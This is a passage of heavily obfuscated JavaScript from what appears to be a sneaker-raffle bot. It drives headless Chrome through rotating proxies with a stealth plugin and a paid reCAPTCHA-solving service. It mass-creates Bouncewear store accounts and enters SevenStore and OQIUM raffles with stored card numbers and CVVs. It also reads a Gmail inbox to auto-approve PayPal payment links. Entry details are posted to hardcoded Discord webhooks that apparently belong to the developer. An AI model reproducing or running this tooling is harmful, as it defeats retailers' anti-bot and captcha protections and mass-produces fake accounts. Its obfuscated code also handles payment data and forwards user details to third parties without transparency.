            return _0x60a3da['map'](_0x4cca72 => _0x4cca72['href']);
        });
        return _0xd87547 = _0x16e3b6;
    } catch (_0x4f97f6) {
        console['log']('\x20' + _0x4f97f6);
    } finally {
        _0x23ccf7['close'](), console['clear']();
    }
}
;
async function _0x2c813c(_0x194c5d, _0x433e92) {
    _0x3df2da['use'](_0x6b6409()), _0x3df2da['use'](_0x371b3c({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x15bf3f['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x40da0c = 0x0; _0x40da0c < bouncewear['length']; _0x40da0c++) {
        await _0x412246(bouncewear, _0x40da0c);
        if (bouncewear[_0x40da0c]['Email'] == '' || bouncewear[_0x40da0c]['Password'] == '' || bouncewear[_0x40da0c]['FirstName'] == '' || bouncewear[_0x40da0c]['LastName'] == '') {
            console['log'](_0x1c7496() + '\x20[' + _0x306e17[taskModule]['name'] + ']\x20Task\x20' + (_0x40da0c + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x15bf3f['useRandomProxy'] = ![])
            var _0x224eb4 = _0xaf207c()[_0x40da0c]['split'](':');
        else
            var _0x3a0745 = Math['round'](Math['random']() * (_0xaf207c()['length'] - 0x1)), _0x224eb4 = _0xaf207c()[_0x3a0745]['split'](':');
        const _0x5adf4f = await _0x3df2da['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x224eb4[0x0] + ':' + _0x224eb4[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x2e40e7 = await _0x5adf4f['newPage']();
            await _0x2e40e7['authenticate']({
                'username': '' + _0x224eb4[0x2],
                'password': '' + _0x224eb4[0x3]
            }), console['log'](_0x1c7496() + '\x20[' + _0x433e92['name'] + ']\x20Task\x20' + (_0x40da0c + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2e40e7['setRequestInterception'](!![]), _0x2e40e7['on']('request', _0x376864 => {
                _0x376864['resourceType']() === 'image' || _0x376864['resourceType']() === 'font' || _0x376864['resourceType']() === 'media' ? _0x376864['abort']() : _0x376864['continue']();
            }), await _0x2e40e7['goto'](_0x194c5d), await _0x37731a(0xbb8), await _0x2e40e7['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x1c7496() + '\x20[' + _0x433e92['name'] + ']\x20Task\x20' + (_0x40da0c + 0x1) + '\x20:\x20Filling\x20information'), await _0x2e40e7['type']('#RegisterForm-FirstName', '' + bouncewear[_0x40da0c]['FirstName']), await _0x37731a(0x226), await _0x2e40e7['type']('#RegisterForm-LastName', '' + bouncewear[_0x40da0c]['LastName']), await _0x37731a(0x226), await _0x2e40e7['type']('#RegisterForm-email', '' + bouncewear[_0x40da0c]['Email']), await _0x37731a(0x226), await _0x2e40e7['type']('#RegisterForm-password', '' + bouncewear[_0x40da0c]['Password']), await _0x37731a(0x226), await _0x2e40e7['click']('#marketing'), console['log'](_0x1c7496() + '\x20[' + _0x433e92['name'] + ']\x20Task\x20' + (_0x40da0c + 0x1) + '\x20:\x20Submitting..'), await _0x2e40e7['$eval']('#RegisterForm', _0x497950 => _0x497950['submit']()), await _0x37731a(0x1f40), console['log'](_0x1c7496() + '\x20[' + _0x433e92['name'] + ']\x20Task\x20' + (_0x40da0c + 0x1) + '\x20:\x20Solving\x20Captcha'), await _0x2e40e7['solveRecaptchas'](), await _0x2e40e7['click']('.shopify-challenge__button.btn');
            async function _0x533702() {
                for (var _0x982553 = 0x0; _0x982553 < 0x4; _0x982553++) {
                    try {
                        console['log']('try'), await _0x2e40e7['waitForSelector']('.shopify-challenge__error', { 'timeout': 0x1388 }), console['log'](_0x1c7496() + '\x20[' + _0x433e92['name'] + ']\x20Task\x20' + (_0x40da0c + 0x1) + '\x20:\x20' + _0x7ff36['red']('Catpcha\x20failed,\x20retrying..')), await _0x2e40e7['solveRecaptchas'](), await _0x2e40e7['click']('.shopify-challenge__button.btn');
                    } catch {
                        console['log']('catch');
                        break;
                    }
                }
            }
            await _0x533702(), console['log'](_0x1c7496() + '\x20[' + _0x433e92['name'] + ']\x20Task\x20' + (_0x40da0c + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x37731a(0x1f4);
            try {
                await _0x2e40e7['waitForSelector']('.featured-title'), await _0x37731a(0x1f4), console['log'](_0x7ff36['green'](_0x1c7496() + '\x20[' + _0x433e92['name'] + ']\x20Task\x20' + (_0x40da0c + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x40da0c]['Email'] + '\x20Generated!')), _0x241ca2['appendFileSync']('../accounts/bouncewear.csv', '\x0a' + bouncewear[_0x40da0c]['Email'] + ',' + bouncewear[_0x40da0c]['Password']), console['log'](_0x7ff36['yellow'](_0x1c7496() + '\x20[' + _0x433e92['name'] + ']\x20Task\x20' + (_0x40da0c + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x40da0c]['Email'] + '\x20Saved\x20in\x20\x27accounts/bouncewear.csv\x27'));
            } catch (_0x3ae3b1) {
                console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x306e17[taskModule]['name'] + ']\x20Task\x20' + (_0x40da0c + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x3ae3b1));
            }
        } catch (_0x3e592f) {
            console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x306e17[taskModule]['name'] + ']\x20Task\x20' + (_0x40da0c + 0x1) + '\x20:\x20' + _0x3e592f));
        } finally {
            _0x5adf4f && _0x5adf4f['close'](), console['log']('Waiting\x20for\x20' + _0x15bf3f['delay'] + '\x20ms'), await _0x37731a(_0x15bf3f['delay']);
        }
    }
}
async function _0xef6400(_0x597adf, _0x19f7d7, _0x3a269d) {
    _0x3df2da['use'](_0x6b6409()), _0x3df2da['use'](_0x371b3c({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x15bf3f['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x224924 = 0x0; _0x224924 < _0x19f7d7['length']; _0x224924++) {
        _0x57fa03(_0x597adf['name'] + '\x20Task\x20' + (_0x224924 + 0x1) + '\x20/\x20' + _0x19f7d7['length'] + '\x20||\x20File:\x20' + _0x5b46f0 + '\x20Proxies:\x20' + _0x519e9c);
        var _0x42500c = [{
            'type': 'rich',
            'title': 'Succesful\x20SevenStore\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x6362be
                },
                {
                    'name': 'Product',
                    'value': '' + _0x19f7d7[_0x224924]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x19f7d7[_0x224924]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x15bf3f['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x15bf3f['version']
                }
            ]
        }];
        const _0x46610c = { 'embeds': _0x42500c };
        await _0x412246(_0x19f7d7, _0x224924);
        if (_0x19f7d7[_0x224924]['Email'] == '' || _0x19f7d7[_0x224924]['Password'] == '' || _0x19f7d7[_0x224924]['FirstName'] == '' || _0x19f7d7[_0x224924]['LastName'] == '') {
            console['log'](_0x1c7496() + '\x20[' + _0x597adf['name'] + ']\x20Task\x20' + (_0x224924 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        (_0x19f7d7[_0x224924]['Password'] == '' || _0x19f7d7[_0x224924]['Password'] == undefined) && (_0x19f7d7[_0x224924]['Password'] = 'ErehsaWonRaj1!');
        if (_0x15bf3f['useRandomProxy'] = ![])
            var _0x3a89ab = _0x3a269d[_0x224924]['split'](':');
        else
            var _0x3d1418 = Math['round'](Math['random']() * (_0x3a269d['length'] - 0x1)), _0x3a89ab = _0x3a269d[_0x3d1418]['split'](':');
        const _0x38bc46 = await _0x3df2da['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x3a89ab[0x0] + ':' + _0x3a89ab[0x1],
                '--no-sandbox',
                '--incognito',
                '--disable-web-security',
                '--disable-features=IsolateOrigins',
                '\x20--disable-site-isolation-trials',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x47550f = await _0x38bc46['newPage']();
            await _0x47550f['authenticate']({
                'username': '' + _0x3a89ab[0x2],
                'password': '' + _0x3a89ab[0x3]
            }), console['log'](_0x1c7496() + '\x20[' + _0x597adf['name'] + ']\x20Task\x20' + (_0x224924 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x47550f['setRequestInterception'](!![]), _0x47550f['on']('request', _0x41bafb => {
                _0x41bafb['resourceType']() === 'image' || _0x41bafb['resourceType']() === 'font' || _0x41bafb['resourceType']() === 'media' ? _0x41bafb['abort']() : _0x41bafb['continue']();
            }), await _0x47550f['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            }), await _0x47550f['goto']('' + _0x19f7d7[_0x224924]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0x1d4c0
            }), await _0x47550f['waitForSelector']('#btnPdpAtb'), console['log'](_0x1c7496() + '\x20[' + _0x597adf['name'] + ']\x20Task\x20' + (_0x224924 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x19f7d7[_0x224924]['Size']);
            const _0x2960c3 = await _0x47550f['$$eval']('div.pointer.pdpsizeoption.f-12.f-color3', _0xd85f7f => {
                return _0xd85f7f['map'](_0x450c13 => _0x450c13['innerText']);
            }), _0x2e9ad0 = await _0x47550f['$$']('div.pointer.pdpsizeoption.f-12.f-color3'), _0x172147 = ![];
            if (_0x19f7d7[_0x224924]['Size'] == 'RANDOM') {
                var _0x28bbac = Math['round'](Math['random']() * (_0x2e9ad0['length'] - 0x1));
                await _0x2e9ad0[_0x28bbac]['click']();
            } else
                for (var _0x527176 = 0x0; _0x527176 < _0x2960c3['length']; _0x527176++) {
                    if (_0x2960c3[_0x527176] != _0x19f7d7[_0x224924]['Size'])
                        continue;
                    try {
                        await _0x2e9ad0[_0x527176]['click']();
                    } catch {
                        console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x597adf['name'] + ']\x20Task\x20' + (_0x224924 + 0x1) + '\x20:\x20Size\x20Not\x20Found')), _0x172147 = !![];
                    }
                }
            if (_0x172147)
                continue;
            await _0x37731a(0x578), await _0x47550f['click']('#btnPdpAtb'), await _0x47550f['waitForSelector']('.fa.fa-check-circle.f-color8.f-30.valign-middle-important'), await _0x37731a(0x3e8), console['log'](_0x1c7496() + '\x20[' + _0x597adf['name'] + ']\x20Task\x20' + (_0x224924 + 0x1) + '\x20:\x20Getting\x20Checkout\x20Session'), await _0x47550f['goto']('https://www.sevenstore.com/login/?target=checkout'), await _0x47550f['waitForSelector']('#email'), await _0x47550f['type']('#email', _0x19f7d7[_0x224924]['Email']), await _0x37731a(0x226), await _0x47550f['click']('#guest-submit'), await _0x37731a(0x1b58), console['log'](_0x1c7496() + '\x20[' + _0x597adf['name'] + ']\x20Task\x20' + (_0x224924 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x47550f['waitForSelector']('#firstname'), await _0x47550f['type']('#firstname', _0x19f7d7[_0x224924]['FirstName'], 0x1f4), await _0x37731a(0x190), await _0x47550f['waitForSelector']('#surname'), await _0x47550f['type']('#surname', _0x19f7d7[_0x224924]['LastName'], 0x1f4), await _0x37731a(0x190), await _0x47550f['waitForSelector']('#mobile'), await _0x47550f['type']('#mobile', _0x19f7d7[_0x224924]['Phone'], 0x1f4), await _0x37731a(0x190), await _0x47550f['click']('#enterManualDiv'), await _0x37731a(0x5dc), await _0x47550f['waitForSelector']('#address1'), await _0x47550f['type']('#address1', _0x19f7d7[_0x224924]['Address1'] + '\x20' + _0x19f7d7[_0x224924]['HouseNumber'], 0x226), await _0x37731a(0x384), await _0x47550f['waitForSelector']('#address2'), await _0x47550f['type']('#address2', '' + _0x19f7d7[_0x224924]['Address2'], 0x226), await _0x37731a(0x320);
            const _0x4e93c5 = await _0x47550f['$$eval']('#countryselect_view3\x20>\x20option', _0x4f7782 => {
                return _0x4f7782['map'](_0x970443 => _0x970443['value']);
            });
            var _0x485426;
            for (var _0x55d4c1 = 0x0; _0x55d4c1 < _0x4e93c5['length']; _0x55d4c1++) {
                if (_0x4e93c5[_0x55d4c1]['startsWith']('' + _0x19f7d7[_0x224924]['Country'])) {
                    _0x485426 = _0x4e93c5[_0x55d4c1];
                    break;
                }
                continue;
            }
            await _0x47550f['select']('#countryselect_view3', '' + _0x485426), await _0x47550f['waitForSelector']('#address4'), await _0x47550f['type']('#address4', '' + _0x19f7d7[_0x224924]['City'], 0x1f4), await _0x37731a(0x384), await _0x47550f['waitForSelector']('#postcode'), await _0x47550f['type']('#postcode', '' + _0x19f7d7[_0x224924]['Zip'], 0x1f4), await _0x37731a(0x4b0);
            const _0x68939 = await _0x47550f['url']();
            console['log'](_0x1c7496() + '\x20[' + _0x597adf['name'] + ']\x20Task\x20' + (_0x224924 + 0x1) + '\x20:\x20Submitting\x20Entry');
            const _0x32680c = _0x68939['split']('?')[0x1], _0x496b73 = await _0x47550f['$']('#co_address_submit');
            await _0x496b73['evaluate'](_0x15510b => _0x15510b['click']()), await _0x37731a(0x1388), await _0x47550f['goto']('https://www.sevenstore.com/checkout/pay/?' + _0x32680c), console['log'](_0x1c7496() + '\x20[' + _0x597adf['name'] + ']\x20Task\x20' + (_0x224924 + 0x1) + '\x20:\x20Getting\x20Payment\x20session'), await _0x47550f['waitForSelector']('#paymentbuttons'), await _0x37731a(0x1388), await _0x47550f['click']('#paymentbuttons\x20>\x20div'), await _0x37731a(0x1c2), await _0x47550f['waitForSelector']('#card-number'), await _0x47550f['waitForSelector']('#card-number\x20>\x20div\x20>\x20iframe');
            const _0x491d50 = await _0x47550f['$']('#card-number\x20>\x20div\x20>\x20iframe'), _0x668c0d = await _0x491d50['contentFrame']();
            await _0x668c0d['waitForSelector']('.InputContainer'), await _0x668c0d['click']('.InputContainer\x20>\x20input'), await _0x37731a(0x578), await _0x47550f['type']('#card-number', '' + _0x19f7d7[_0x224924]['CreditNumber']), await _0x37731a(0xfa), await _0x47550f['type']('#card-expiry', '' + _0x19f7d7[_0x224924]['ExpiryDate']), await _0x37731a(0xfa), await _0x47550f['type']('#card-cvc', '' + _0x19f7d7[_0x224924]['CVV']), await _0x37731a(0x7d0), await _0x47550f['click']('#card-button'), console['log'](_0x1c7496() + '\x20[' + _0x597adf['name'] + ']\x20Task\x20' + (_0x224924 + 0x1) + '\x20:\x20Awaiting\x203DS');
            try {
                await _0x47550f['waitForSelector']('.btn-auxilliary.btn-sub.fullwidth', { 'timeout': 0x493e0 }), console['log'](_0x7ff36['green'](_0x1c7496() + '\x20[' + _0x597adf['name'] + ']\x20Task\x20' + (_0x224924 + 0x1) + '\x20:\x20Raffle\x20Entered!')), await _0x4160b0(_0x4ebf40, _0x46610c);
            } catch {
                console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x597adf['name'] + ']\x20Task\x20' + (_0x224924 + 0x1) + '\x20:\x203DS\x20Failed')), _0x42500c[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x42500c[0x0]['description'] = '3DS\x20Failed', await _0x4160b0(_0x3ce78e, _0x46610c);
            }
        } catch (_0x449801) {
            console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x597adf['name'] + ']\x20Task\x20' + (_0x224924 + 0x1) + '\x20:\x20' + _0x449801)), _0x42500c[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x42500c[0x0]['description'] = '' + _0x449801, await _0x4160b0(_0x3ce78e, _0x46610c);
        } finally {
            _0x38bc46 && _0x38bc46['close']();
            if (_0x224924 + 0x1 == _0x19f7d7['length']) {
                console['log'](_0x7ff36['green']('Finished\x20tasks,\x20returning\x20to\x20Main\x20Menu')), await _0x37731a(0x7d0);
                break;
            }
            console['log']('Waiting\x20for\x20' + _0x15bf3f['AfewDelay'] + '\x20ms'), await _0x37731a(_0x15bf3f['AfewDelay']);
        }
    }
}
async function _0x2b0913(_0x53e310, _0x27622d, _0x125f7c, _0xfc5795, _0xe4b5bd) {
    var _0x19fd50, _0x10337f = {}, _0x200d4a = [], _0x39aa58 = {}, _0x2b6299 = [
        '40',
        '40,5',
        '41',
        '42',
        '42,5',
        '43',
        '44',
        '45',
        '45,5',
        '46',
        '47',
        '47,5',
        '48'
    ];
    !_0xfc5795 && (_0xfc5795 = {});
    if (_0x27622d != 'ver') {
        _0x57fa03(_0x125f7c['name'] + '\x20Task\x20' + (_0x53e310 + 0x1) + '\x20/\x20' + _0xfc5795['length'] + '\x20||\x20File:\x20' + _0x5b46f0 + '\x20Proxies:\x20' + _0x519e9c), await _0x412246(_0xfc5795, _0x53e310), _0x200d4a = [{
            'type': 'rich',
            'title': 'Succesful\x20OQIUM\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x6362be
                },
                {
                    'name': 'Size',
                    'value': '' + _0xfc5795[_0x53e310]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x15bf3f['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x2bd99c
                }
            ]
        }], _0x39aa58 = { 'embeds': _0x200d4a }, _0x10337f = _0x125f7c['data'];
        _0x27622d == 'exp' ? _0x10337f['data']['attributes']['email'] = '' + _0xfc5795[_0x53e310]['FirstName'] + _0xfc5795[_0x53e310]['LastName'] + _0x15bf3f['catchall'] : _0x10337f['data']['attributes']['email'] = '' + _0xfc5795[_0x53e310]['Email'];
        if (_0xfc5795[_0x53e310]['Size'] == 'RANDOM') {
        }
        _0x10337f['data']['attributes']['properties']['$first_name'] = '' + _0xfc5795[_0x53e310]['FirstName'], _0x10337f['data']['attributes']['properties']['$last_name'] = '' + _0xfc5795[_0x53e310]['LastName'], _0x10337f['data']['attributes']['properties']['$address1'] = _0xfc5795[_0x53e310]['Address1'] + '\x20' + _0xfc5795[_0x53e310]['Address2'] + '\x20' + _0xfc5795[_0x53e310]['HouseNumber'], _0x10337f['data']['attributes']['properties']['$zip'] = '' + _0xfc5795[_0x53e310]['Zip'], _0x10337f['data']['attributes']['properties']['$city'] = '' + _0xfc5795[_0x53e310]['City'], _0x10337f['data']['attributes']['properties']['$country'] = '' + _0xfc5795[_0x53e310]['Country'], _0x10337f['data']['attributes']['properties']['Size'] = '' + _0xfc5795[_0x53e310]['Size'], _0x10337f['data']['attributes']['properties']['$phone_number'] = '' + _0xfc5795[_0x53e310]['Phone'], _0x10337f['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0xfc5795[_0x53e310]['Follower'];
    }
    if (_0x15bf3f['useRandomProxy'] = ![])
        var _0x286f39 = _0xe4b5bd[_0x53e310]['split'](':');
    else
        var _0x3940ea = Math['round'](Math['random']() * (_0xe4b5bd['length'] - 0x1)), _0x286f39 = _0xe4b5bd[_0x3940ea]['split'](':');
    var _0x241be4 = {
        'jar': _0x50eb26,
        'followAllRedirects': !![],
        'method': 'POST',
        'url': _0x125f7c['url'],
        'headers': _0x125f7c['headers'],
        'body': JSON['stringify'](_0x10337f),
        'proxy': 'http://' + _0x286f39[0x2] + ':' + _0x286f39[0x3] + '@' + _0x286f39[0x0] + ':' + _0x286f39[0x1]
    };
    return _0x27622d != 'ver' && (_0x241be4['url'] = _0x125f7c['url'], _0x241be4['headers'] = _0x125f7c['headers']), _0x27622d == 'ver' && (_0x241be4['method'] = 'GET'), new Promise(function (_0x31fdb5, _0x4d008b) {
        callback = async (_0x2d1d0c, _0x2204a7, _0x2036d1) => {
            if (!_0x2d1d0c && _0x2204a7['statusCode'] == 0xca || !_0x2d1d0c && _0x2204a7['statusCode'] == 0xc8) {
                if (_0x27622d != 'ver') {
                    var _0x47dc2f = await _0x5c5001(_0xfc5795[_0x53e310], _0x125f7c, 'dev', ![]), _0x7036b2 = await _0x5c5001(_0xfc5795[_0x53e310], _0x125f7c, 'pub', ![]);
                    const _0x3dff12 = {
                        'succesDEVMSG': { 'embeds': [_0x47dc2f] },
                        'succesPUBMSG': { 'embeds': [_0x7036b2] }
                    };
                    if (_0x15bf3f['webhook'] != undefined && _0x15bf3f['webhook'] != '')
                        try {
                            await _0x4160b0(_0x15bf3f['webhook'], _0x3dff12['succesDEVMSG']);
                        } catch {
                        }
                    await _0x37731a(0xc8), await _0x4160b0(_0x4ebf40, _0x3dff12['succesDEVMSG']), await _0x37731a(0xc8);
                    try {
                        await _0x4160b0(_0xd6338c, _0x3dff12['succesPUBMSG']);
                    } catch {
                    }
                    _0x5879e0(_0xfc5795[_0x53e310], _0x125f7c);
                }
                _0x31fdb5(console['log'](_0x7ff36['green'](_0x1c7496() + '\x20[' + _0x125f7c['name'] + ']\x20Task\x20' + (_0x53e310 + 0x1) + ':\x20Raffle\x20Entered!')));
            } else {
                if (_0x27622d != 'ver') {
                    var _0x1d5d2f = '' + _0x2d1d0c, _0x8760ea = await _0x5c5001(_0xfc5795[_0x53e310], _0x125f7c, 'dev', !![], _0x1d5d2f), _0x42cef6 = {};
                    _0x42cef6['errorDEV'] = { 'embeds': [_0x8760ea] }, _0x17fcb0(_0xfc5795[_0x53e310], _0x125f7c), _0x15bf3f['webhook'] != undefined && _0x15bf3f['webhook'] != '' && await _0x4160b0(_0x15bf3f['webhook'], _0x42cef6['errorDEV']), await _0x4160b0(_0x3ce78e, _0x42cef6['errorDEV']);
                }
                _0x4d008b(console['log'](_0x1c7496() + '\x20[' + _0x125f7c['name'] + ']\x20Task\x20' + (_0x53e310 + 0x1) + ':\x20' + _0x2d1d0c));
            }
        };
        try {
            _0x27622d != 'ver' && console['log'](_0x1c7496() + '\x20[' + _0x125f7c['name'] + ']\x20Task\x20' + (_0x53e310 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x10337f['data']['attributes']['email']), _0x5b6a7b(_0x241be4, callback);
        } catch (_0x584912) {
            console['log'](_0x1c7496() + '\x20Task\x20' + (_0x53e310 + 0x1) + ':\x20' + _0x584912);
        }
    });
}
;
async function _0x114254(_0x388849, _0x26b322) {
    if (_0x4a2f2e != 'yes')
        var _0x4a2f2e = '', _0x57d228 = 0x0;
    var _0x500289 = [];
    async function _0x1c5f61() {
        console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify?');
        var _0x30ea99 = await _0x8ec788['get']('Quantity')['Quantity'], _0x4d7d55 = new _0x3451ed({
            'user': _0x15bf3f['masterMail'],
            'password': _0x15bf3f['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x18adb6(_0x4d46e0) {
            _0x4d7d55['openBox']('INBOX', ![], _0x4d46e0);
        }
        _0x4d7d55['once']('ready', function () {
            _0x18adb6(function (_0x3ab330, _0x26da43) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x3ab330)
                    throw _0x3ab330;
                _0x4d7d55['seq']['search']([
                    'UNSEEN',
                    [
                        'SUBJECT',
                        'PayPal'
                    ]
                ], function (_0x115740, _0x5ab3fe) {
                    if (!_0x5ab3fe || !_0x5ab3fe['length'])
                        console['log'](_0x1c7496() + '\x20[' + _0x388849['name'] + ']\x20No\x20mails\x20found'), _0x4d7d55['end']();
                    else {
                        var _0x5dae72 = _0x4d7d55['seq']['fetch'](_0x5ab3fe, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x5dae72['on']('message', function (_0x113a2b, _0x3d7805) {
                            var _0x18c5bf = '(#' + _0x3d7805 + ')\x20';
                            _0x113a2b['on']('body', function (_0x34ef5e, _0x28e2b9) {
                                _0x34a37a(_0x34ef5e, (_0xa969a6, _0x2c3eeb) => {
                                    if (_0x2c3eeb['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x2c3eeb['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x2c3eeb['text']['split']('[')[0x2];
                                        var _0x340b3a = mes['split'](']')[0x0];
                                        _0x500289['push'](_0x340b3a);
                                    }
                                });
                            }), _0x113a2b['once']('end', function () {
                            });
                        }), _0x5dae72['once']('error', function (_0x529b53) {
                            console['log']('Fetch\x20error:\x20' + _0x529b53);
                        }), _0x5dae72['once']('end', function () {
                            _0x4d7d55['end']();
                        });
                    }
                });
            });
        }), _0x4d7d55['once']('error', function (_0x12dc18) {
            console['log'](_0x7ff36['red'](_0x12dc18['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x4d7d55['once']('end', async function () {
        }), _0x4d7d55['connect']();
    }
    try {
        _0x1c5f61(), await _0x37731a(0xfa0), console['log']('Found\x20' + _0x500289['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x37731a(0xfa0);
    }
    var _0x3089b2;
    _0x57fa03('' + _0x388849);
    var _0xbb52a8 = _0x26b322[0x0]['split'](':'), _0x731333;
    try {
        _0x731333 = await _0x3df2da['launch']({
            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0xbb52a8[0x0] + ':' + _0xbb52a8[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    } catch {
        _0x731333 = await _0x3df2da['launch']({
            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0xbb52a8[0x0] + ':' + _0xbb52a8[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    }
    try {
        console['log'](_0x1c7496() + '\x20[' + _0x388849 + ']\x20Getting\x20Session');
        const _0x39be76 = await _0x731333['newPage']();
        await _0x39be76['authenticate']({
            'username': '' + _0xbb52a8[0x2],
            'password': '' + _0xbb52a8[0x3]
        }), await _0x39be76['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x39be76, await _0x39be76['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x1c7496() + '\x20[' + _0x388849 + ']\x20Log\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x39be76['waitForSelector']('#cwBalance', { 'timeout': 0x493e0 }), console['log'](_0x1c7496() + '\x20[' + _0x388849 + ']\x20Successfully\x20logged\x20in'), await _0x37731a(0x2710);
        } catch (_0x59804b) {
            throw new Error('Login\x20session\x20expired\x20' + _0x59804b);
        }
        for (var _0x366cd5 = 0x0; _0x366cd5 < _0x500289['length']; _0x366cd5++) {
            console['log'](_0x1c7496() + '\x20[' + _0x388849 + ']\x20Task\x20' + (_0x366cd5 + 0x1) + '\x20:\x20Starting\x20Verification'), _0x57fa03(_0x388849 + '\x20Task\x20' + (_0x366cd5 + 0x1) + '\x20/\x20' + _0x500289['length']);
            const _0xbbe81c = await _0x731333['newPage']();
            await _0xbbe81c['goto']('' + _0x500289[_0x366cd5], { 'waitUntil': 'networkidle2' }), await _0x37731a(0xbb8);
            try {
                const _0x457b9a = await _0xbbe81c['$']('#challenge-heading');
                _0x457b9a && (console['log'](_0x1c7496() + '\x20[' + _0x388849 + ']\x20Task\x20' + (_0x366cd5 + 0x1) + '\x20:\x20' + _0x7ff36['yellow']('2FA\x20Required')), await _0xbbe81c['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x37731a(0x9c40), await _0xbbe81c['waitForSelector']('#payment-submit-btn'), await _0xbbe81c['$eval']('#payment-submit-btn', _0x2dccf4 => _0x2dccf4['click']()), await _0xbbe81c['click']('#payment-submit-btn');
                try {
                    await _0xbbe81c['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x37731a(0x5dc), console['log'](_0x7ff36['green'](_0x1c7496() + '\x20[' + _0x388849 + ']\x20Task\x20' + (_0x366cd5 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x4efe09) {
                    _0x4a2f2e = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0x4efe09['message']);
                } finally {
                    if (_0x4a2f2e == 'yes' && _0x57d228 != 0x2) {
                        console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x388849['name'] + ']\x20Task\x20' + (_0x366cd5 + 0x1) + '\x20:\x20Retrying\x20(' + _0x57d228 + '\x20/\x205)')), _0x366cd5 = _0x366cd5 - 0x1, _0x57d228 = _0x57d228 + 0x1;
                        continue;
                    }
                    _0x4a2f2e == 'yes' && _0x57d228 >= 0x2 && (_0x17fcb0(csv[_0x366cd5], _0x388849), _0x4a2f2e = 'no', _0x57d228 = 0x0), await _0xbbe81c['close'](), await _0x37731a(0x4650);
                }
            } catch (_0x27055f) {
                console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x388849 + ']\x20Task\x20' + (_0x366cd5 + 0x1) + '\x20:\x20' + _0x27055f));
            }
        }
    } catch (_0x5593a4) {
        console['log'](_0x7ff36['red']('' + _0x5593a4));
    } finally {
        await _0x731333['close']();
    }
}
const _0x306e17 = [
    {
        'name': '4ELEMENTOS',
        'modules': [
            {
                'name': '4ELEMENTOS\x20Raffle\x20Entries',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x7e7f73, _0x147104, _0x2db609) {
                    _0x3df2da['use'](_0x6b6409()), _0x3df2da['use'](_0x371b3c({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x15bf3f['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x8baab8 = 0x0; _0x8baab8 < _0x147104['length']; _0x8baab8++) {
                        if (_0x192aef != 'yes')
                            var _0x192aef = '', _0x48575b = 0x0;
                        var _0x516b9f;
                        try {
                            await _0x412246(_0x147104, _0x8baab8);
